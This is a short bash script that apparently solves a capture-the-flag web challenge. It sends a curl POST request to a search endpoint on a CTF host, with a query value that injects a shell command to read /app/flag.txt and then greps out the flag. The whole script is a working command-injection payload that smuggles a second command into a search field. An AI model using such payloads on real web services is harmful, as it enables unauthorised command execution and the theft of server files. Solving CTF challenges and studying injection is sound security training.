#!/bin/bash

curl -s -X POST http://knowledge-base.web.jeanne-hack-ctf.org/search -d "query='+{}+\;+;+cat+/app/flag.txt+#" -H "Cookie: user_id=$(uuidgen)" | grep -o 'JDHACK{.*}'
